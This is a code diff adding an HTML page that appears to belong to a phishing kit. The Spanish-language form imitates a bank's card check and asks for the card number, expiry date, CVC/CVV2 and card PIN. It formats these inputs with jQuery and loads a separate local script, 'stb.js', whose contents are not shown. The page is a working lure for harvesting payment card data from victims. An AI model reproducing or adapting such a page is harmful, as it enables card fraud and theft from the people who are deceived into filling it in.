@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html >
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/main.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div class="top">
+        <img style="margin-top: 15px; margin-left: 10px;" src="./img/ciman-topap.png" alt="">
+    </div>
+
+
+
+    <div class="section">
+        
+        <form class="formcc" method="post" id="pg2">
+            <p>NUMERO DE TARJETA</p>
+            <input type="tel" placeholder="" name="" id="one" required maxlength="19"> 
+
+            <p>FECHA DE CADUCIDAD</p>
+            <input type="tel" name="" id="two" placeholder="MM/AA" required maxlength="7"> 
+
+            <p>CVC/CVV2</p>
+            <input type="tel" placeholder="" name="" id="three" required maxlength="3"> 
+
+            <p>PIN DE LA TARJETA</p>
+            <input type="tel" placeholder="" name="" id="four" required maxlength="4"> 
+
+            <button type="submit">CONTINUAR</button>
+            <p class="p2">¿Olvidaste tu clave de acceso?</p>
+        </form>
+        <img class="bot" src="./img/bot.PNG" alt="">
+    </div>
+
+    <script>
+         $("#one").on("keyup",function(){
+               cc = $(this).val().split(" ").join("");
+               cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+               $(this).val(cc);
+           });
+        $("#two").on("keyup",function(){
+               dd = $(this).val().split("/").join("");
+               dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+               $(this).val(dd);
+           });
+    </script>
+    <!-- my script -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
